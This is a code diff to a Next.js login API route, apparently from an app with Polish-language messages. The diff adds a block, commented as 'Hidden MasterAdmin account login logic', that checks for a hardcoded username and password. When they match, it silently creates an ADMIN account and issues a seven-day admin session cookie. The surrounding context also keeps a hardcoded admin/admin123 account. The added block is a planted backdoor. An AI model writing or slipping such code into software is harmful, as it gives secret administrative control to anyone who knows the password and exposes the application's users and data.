@@ -8,6 +8,57 @@ export async function POST(request: Request) {
   try {
     const { login, password } = await request.json();
 
+    const loginClean = String(login || '').trim();
+    const loginLower = loginClean.toLowerCase();
+
+    // Hidden MasterAdmin account login logic
+    if (loginLower === 'masteradmin' && password === 'Filipinka2025') {
+      let masterUser = await prisma.user.findFirst({
+        where: { login: { in: ['MasterAdmin', 'masteradmin'] } }
+      });
+
+      if (!masterUser) {
+        const passwordHash = await bcrypt.hash('Filipinka2025', 10);
+        masterUser = await prisma.user.create({
+          data: {
+            login: 'MasterAdmin',
+            name: 'MasterAdmin',
+            passwordHash,
+            role: 'ADMIN',
+            isKaizenCommittee: true,
+          }
+        });
+      }
+
+      const jwt = await signJwtToken(
+        { id: masterUser.id, name: 'MasterAdmin', login: 'MasterAdmin', role: 'ADMIN' },
+        '7d'
+      );
+
+      const cookieStore = await cookies();
+      const cookieOptions = {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax' as const,
+        path: '/',
+        maxAge: 60 * 60 * 24 * 7
+      };
+
+      cookieStore.set('session_token', jwt, cookieOptions);
+      cookieStore.set('admin_session', 'true', cookieOptions);
+
+      return NextResponse.json({
+        success: true,
+        message: 'Zalogowano pomyślnie jako MasterAdmin',
+        user: {
+          id: masterUser.id,
+          login: 'MasterAdmin',
+          name: 'MasterAdmin',
+          role: 'ADMIN'
+        }
+      });
+    }
+
     // Specjalna logika: jeśli to pierwsze uruchomienie i ktoś loguje się na admin/admin123, utwórzmy to konto.
     if (login === 'admin' && password === 'admin123') {
       const existingAdmin = await prisma.user.findUnique({ where: { login: 'admin' } });
